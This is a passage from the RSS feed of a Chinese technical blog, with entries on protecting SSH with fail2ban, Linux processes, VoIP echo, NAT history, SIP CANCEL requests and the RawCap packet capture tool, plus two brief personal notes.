&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;安装fail2ban&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;完成后&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;systemctl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;enable&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fail2ban&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;设置fail2ban开机启动&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;systemctl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fail2ban&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;启动fail2ban&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;systemctl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fail2ban&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;查看fail2ban的运行状态&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;用fail2ban保护ssh&#34;&gt;用fail2ban保护ssh&lt;/h1&gt;
&lt;p&gt;fail2ban的配置文件位于/etc/fail2ban目录下。&lt;/p&gt;
&lt;p&gt;在该目录下建立一个文件 jail.local, 内容如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bantime 持续禁止多久&lt;/li&gt;
&lt;li&gt;maxretry 最大多少次尝试&lt;/li&gt;
&lt;li&gt;banaction 拦截后的操作&lt;/li&gt;
&lt;li&gt;findtime 查找时间&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;看下下面的操作的意思是：监控sshd服务的最近10分钟的日志，如果某个ip在10分钟之内，有2次登录失败，就把这个ip加入黑名单, 24小时之后，这个ip才会被从黑名单中移除。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;DEFAULT&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;bantime&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;banaction&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iptables&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;multiport&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;maxretry&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;findtime&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;m&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;sshd&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;enabled&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后重启fail2ban, &lt;code&gt;systemctl restart fail2ban&lt;/code&gt; &lt;/p&gt;
&lt;p&gt;fail2ban提供管理工具fail2ban-client&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**fail2ban-client status **显示fail2ban的状态&lt;/li&gt;
&lt;li&gt;**fail2ban-client status sshd **显示某个监狱的配置。从下文的输出来看可以看出来fail2ban已经拦截了一些IP地址了&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; fail2ban-client status
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Status
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|- Number of jail:	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;- Jail list:	sshd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; fail2ban-client status sshd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Status &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the jail: sshd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|- Filter
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|  |- Currently failed:	&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|  |- Total failed:	&lt;span style=&#34;color:#ae81ff&#34;&gt;23289&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|  &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;- Journal matches:	_SYSTEMD_UNIT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sshd.service + _COMM&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sshd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;- Actions
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   |- Currently banned:	&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   |- Total banned:	&lt;span style=&#34;color:#ae81ff&#34;&gt;1270&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;- Banned IP list:	93.174.93.10 165.22.238.92 23.231.25.234 134.255.219.207 77.202.192.113 120.224.47.86 144.91.70.139 90.3.194.84 217.182.89.87
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;fail2ban保护sshd的原理&#34;&gt;fail2ban保护sshd的原理&lt;/h1&gt;
&lt;p&gt;fail2ban的配置文件目录下有个filter.d目录，该目录下有个sshd.conf的文件，这个文件就是对于sshd日志的过滤规则，里面有些正常时用来提取出恶意家伙的IP地址。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linux进程和线程</title>
      <link>https://wdd.js.org/posts/2020/04/pbcbub/</link>
      <pubDate>Sat, 25 Apr 2020 20:30:18 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/04/pbcbub/</guid>
      <description>&lt;p&gt;思考题：当你用ssh登录到一个linux机器，并且执行了某个hello.sh之后，有哪些进程参与了该过程?&lt;/p&gt;
&lt;h1 id=&#34;linux系统架构&#34;&gt;linux系统架构&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;kernel mode&lt;/li&gt;
&lt;li&gt;user mode&lt;/li&gt;
&lt;li&gt;内核态和用户态的区别&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/04/pbcbub/2022-10-29-20-27-18.png&#34;&gt;
&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/04/pbcbub/2022-10-29-20-27-24.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;heading&#34;&gt;&lt;/h1&gt;
&lt;h1 id=&#34;什么是进程&#34;&gt;什么是进程&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;进程是运行的程序&lt;/li&gt;
&lt;li&gt;process 是对 processor 虚拟化，通过时间片&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/04/pbcbub/2022-10-29-20-27-31.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;进程都有uid&#34;&gt;进程都有uid&lt;/h1&gt;
&lt;p&gt;nginx访问某个目录，&lt;strong&gt;Permission denied&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/04/pbcbub/2022-10-29-20-27-41.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;进程都有pid&#34;&gt;进程都有pid&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;$$&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/04/pbcbub/2022-10-29-20-27-52.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;进程都有父进程&#34;&gt;进程都有父进程&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;准确来说，除了pid为0的进程之外，其他进程都有父进程&lt;/li&gt;
&lt;li&gt;有时候，你用kill命令杀死了一个进程，但是立马你就发现这个进程又起来了。你就要看看，这个进程是不是有个非init进程的父进程。一般这个进程负责监控子进程，一旦子进程挂掉，就会去重新创建一个进程。所以你需要找到这个父进程的Id，先把父进程kill掉，然后在kill子进程。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/04/pbcbub/2022-10-29-20-27-58.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;进程是一棵树&#34;&gt;进程是一棵树&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pid is &lt;/span&gt;$$&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;times&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; true
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sleep 2s;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	let times++;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo $times hello;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  ~ pstree &lt;span style=&#34;color:#ae81ff&#34;&gt;24601&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sshd─┬─3*&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sshd───zsh&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ├─sshd───zsh───pstree
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     └─sshd───zsh───world.sh───sleep
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;进程都有生命周期&#34;&gt;进程都有生命周期&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;创建&lt;/li&gt;
&lt;li&gt;销毁&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;进程都有状态&#34;&gt;进程都有状态&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;runing 进程占用CPU, 正在执行指令&lt;/li&gt;
&lt;li&gt;ready 进程所有需要的资源都已经就绪，等待进入CPU执行&lt;/li&gt;
&lt;li&gt;blocked 进程被某些事件阻断，例如IO。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;进程的状态转移图&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>老年生活</title>
      <link>https://wdd.js.org/posts/2020/04/ysx4gz/</link>
      <pubDate>Thu, 23 Apr 2020 21:18:22 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/04/ysx4gz/</guid>
      <description>&lt;p&gt;最近感觉提前步入老年生活，晚上九点睡觉，早上六点醒来。醒来之后打盹一会，等着按灭六点十分的闹钟。&lt;/p&gt;
&lt;p&gt;哎，又困了。😩😩😩😩😩😩&lt;/p&gt;</description>
    </item>
    <item>
      <title>简历之吃苦耐劳</title>
      <link>https://wdd.js.org/posts/2020/04/oczker/</link>
      <pubDate>Thu, 23 Apr 2020 21:06:33 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/04/oczker/</guid>
      <description>&lt;p&gt;最近需要招个前端开发，我更想让他向Nodejs方面发展。&lt;/p&gt;
&lt;p&gt;简历看的眼花，不知道为什么有那么多人都在简历上写吃苦难耐，难道做前端开发真的需要吃苦耐劳吗？&lt;/p&gt;
&lt;p&gt;我在NPM上没有找到能收邮件的包，找到了发邮件的包。&lt;/p&gt;
&lt;p&gt;我想找个能收邮件的包，自动收邮件，自动分析和过滤一些不想看的简历。&lt;/p&gt;</description>
    </item>
    <item>
      <title>回音问题调研</title>
      <link>https://wdd.js.org/opensips/ch7/echo-back/</link>
      <pubDate>Wed, 22 Apr 2020 15:12:11 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/echo-back/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch7/echo-back/2022-12-02-14-50-14.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;回音现象&#34;&gt;回音现象&lt;/h1&gt;
&lt;p&gt;说话人能在麦克风中听到自己的说话声。&lt;/p&gt;
&lt;h1 id=&#34;回音的可能原因&#34;&gt;回音的可能原因&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;有的开发，喜欢用分机打自己的号码，你分机和你的手机离得太近，自然回产生回音的。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考资料&#34;&gt;参考资料&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.voiptroubleshooter.com/problems/echo.html&#34;&gt;http://www.voiptroubleshooter.com/problems/echo.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.lifewire.com/how-to-stop-producing-echo-3426515&#34;&gt;https://www.lifewire.com/how-to-stop-producing-echo-3426515&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.voipmechanic.com/voip-top-5-complaints.htm&#34;&gt;https://www.voipmechanic.com/voip-top-5-complaints.htm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://getvoip.com/blog/2012/12/18/the-biggest-causes-behind-echo-in-voip/&#34;&gt;https://getvoip.com/blog/2012/12/18/the-biggest-causes-behind-echo-in-voip/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/huoppo/article/details/6643066&#34;&gt;https://blog.csdn.net/huoppo/article/details/6643066&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>漫话NAT的历史todo</title>
      <link>https://wdd.js.org/opensips/ch1/story-of-nat/</link>
      <pubDate>Fri, 10 Apr 2020 13:18:53 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/story-of-nat/</guid>
      <description>&lt;p&gt;设想一下，如果国家规定，给孩子起名字的时候，不能和已经使用过的活着的人名字相同，会发生什么事情？&lt;/p&gt;
&lt;p&gt;除非把名字起得越来越长，否则名字很快就不够用了。&lt;/p&gt;
&lt;p&gt;在 1993 年的时候，有人就遇到类似的问题，因为 IP 地址快被用完了。&lt;/p&gt;
&lt;p&gt;他们想出两个方案：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;短期方案：CIDR(Classless InterDomain Routing)&lt;/li&gt;
&lt;li&gt;长期方案：开发新的具有更大地址空间的互联网协议。可以认为是目前的 IPv6&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然了长期方案不是一蹴而就的，短期方案才是解决眼前问题的方案。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;a very small percentage of hosts in a stub domain are communicating outside of the domain at any given time&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;短期的方案基于一个逻辑事实：&lt;strong&gt;在一个网络中，只有非常少的几个主机需要跟外部网络交流。也就是说，大部分的主机都在内部交流。那么内部交流的这些主机，实际上并不需要给设置公网 IP。（但是这个只是 1993 年的那个时期的事实）&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;**&lt;!-- raw HTML omitted --&gt;可以类比于，班级内部之间的学生交流很多。班级与班级之间的交流，估计只有班长之间交流。&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/story-of-nat/2022-10-30-21-15-17.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc1631&#34;&gt;https://tools.ietf.org/html/rfc1631&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc1996&#34;&gt;https://tools.ietf.org/html/rfc1996&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc2663&#34;&gt;https://tools.ietf.org/html/rfc2663&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc2993&#34;&gt;https://tools.ietf.org/html/rfc2993&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>CANCEL请求和Reason头</title>
      <link>https://wdd.js.org/opensips/blog/cancel-reason/</link>
      <pubDate>Fri, 10 Apr 2020 10:21:36 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/cancel-reason/</guid>
      <description>&lt;p&gt;原文：&lt;a href=&#34;https://blog.opensips.org/2016/12/29/understanding-and-dimensioning-memory-in-opensips/&#34;&gt;https://blog.opensips.org/2016/12/29/understanding-and-dimensioning-memory-in-opensips/&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Call canceling may look like a trivial mechanism, but it plays an important role in complex scenarios like simultaneous ringing (parallel forking), call pickup, call redirect and many others.
So, aside proper routing of CANCEL requests, reporting the right cancelling reason is equally important.&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;如何正确的处理cancel请求&#34;&gt;如何正确的处理cancel请求？&lt;/h1&gt;
&lt;p&gt;According to &lt;a href=&#34;https://www.ietf.org/rfc/rfc3261.txt&#34;&gt;RFC 3261&lt;/a&gt;,** a CANCEL must be route to the exact same destination (IP, port, protocol) and with the same exact Request-URI as the INVITE it is canceling**. This is required in order to guarantee that the CANCEL will end up (via the same SIP route) in the same place as the INVITE.&lt;!-- raw HTML omitted --&gt;So, &lt;strong&gt;the CANCEL must follow up the INVITE.&lt;/strong&gt; But how to do and script this?&lt;/p&gt;</description>
    </item>
    <item>
      <title>window轻量级抓包工具RawCap介绍</title>
      <link>https://wdd.js.org/posts/2020/04/pfkelh/</link>
      <pubDate>Thu, 09 Apr 2020 16:58:20 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/04/pfkelh/</guid>
      <description>&lt;p&gt;相比于wireshark, RawCap非常小，仅有48kb。&lt;/p&gt;
&lt;p&gt;使用RawCap命令需要&lt;strong&gt;使用管理员权限打开CMD&lt;/strong&gt;，然后进入到RawCap.exe的目录。例如F:\Tools&lt;/p&gt;
&lt;h1 id=&#34;显示网卡列表&#34;&gt;显示网卡列表&lt;/h1&gt;
&lt;p&gt;输入RawCap.exe &amp;ndash;help, 可以显示命令的使用帮助、网卡列表还有使用例子。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F:&lt;span style=&#34;color:#ae81ff&#34;&gt;\T&lt;/span&gt;ools&amp;gt;RawCap.exe --help
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NETRESEC RawCap version 0.2.0.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Usage: RawCap.exe &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;OPTIONS&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &amp;lt;interface&amp;gt; &amp;lt;pcap_target&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &amp;lt;interface&amp;gt; can be an interface number or IP address
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &amp;lt;pcap_target&amp;gt; can be filename, stdout &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; or named pipe &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;starting with &lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\p&lt;/span&gt;ipe&lt;span style=&#34;color:#ae81ff&#34;&gt;\)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;OPTIONS:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -f          Flush data to file after each packet &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;no buffer&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -c &amp;lt;count&amp;gt;  Stop sniffing after receiving &amp;lt;count&amp;gt; packets
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -s &amp;lt;sec&amp;gt;    Stop sniffing after &amp;lt;sec&amp;gt; seconds
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -m          Disable automatic creation of RawCap firewall entry
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -q          Quiet, don&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t print packet count to standard out
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INTERFACES:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 0.     IP        : 169.254.63.243
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NIC Name  : Local Area Connection
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NIC Type  : Ethernet
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 1.     IP        : 192.168.1.129
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NIC Name  : WiFi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NIC Type  : Wireless80211
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 2.     IP        : 127.0.0.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NIC Name  : Loopback Pseudo-Interface &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
